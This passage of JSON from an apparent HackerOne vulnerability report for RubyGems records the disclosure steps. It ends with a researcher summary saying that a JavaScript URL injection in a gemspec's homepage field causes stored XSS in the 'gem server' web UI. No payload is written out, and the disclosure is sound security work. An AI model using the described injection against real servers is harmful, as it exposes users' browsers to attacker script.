18T04:38:23.980Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2403850,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great to hear. Thanks again @claudijd!","markdown_message":"\u003cp\u003eGreat to hear. Thanks again \u003ca href=\"/claudijd\"\u003e@claudijd\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-19T10:37:00.902Z","updated_at":"2018-02-19T10:37:00.902Z","actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2413961,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I got a disclosure request from users. They want to understand details for this vulnerability.","markdown_message":"\u003cp\u003eI got a disclosure request from users. They want to understand details for this vulnerability.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-22T03:35:37.092Z","updated_at":"2018-02-22T03:35:37.092Z","first_to_agree":true,"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2414088,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @hsbt, no problem – disclosing now. Thanks!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hsbt\"\u003e@hsbt\u003c/a\u003e, no problem – disclosing now. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-22T06:30:28.471Z","updated_at":"2018-02-22T06:30:28.471Z","actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2414089,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-22T06:30:28.580Z","updated_at":"2018-02-22T06:30:28.580Z","actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":6670,"category":"researcher","content":"A JavaScript URL injection in the `homepage` field of a Gemspec file can lead to stored XSS within the `gem server` web UI. A similar issue was identified in the [Gem in a Box](https://snyk.io/vuln/SNYK-RUBY-GEMINABOX-20444) and [Gemirro](https://snyk.io/vuln/SNYK-RUBY-GEMIRRO-20445) gems.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eA JavaScript URL injection in the \u003ccode\u003ehomepage\u003c/code\u003e field of a Gemspec file can lead to stored XSS within the \u003ccode\u003egem server\u003c/code\u003e web UI. A similar issue was identified in the \u003ca href=\"/redirect?url=https%3A%2F%2Fsnyk.io%2Fvuln%2FSNYK-RUBY-GEMINABOX-20444\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGem in a Box\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Fsnyk.io%2Fvuln%2FSNYK-RUBY-GEMIRRO-20445\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGemirro\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e gems.\u003c/p\u003e\n"}]}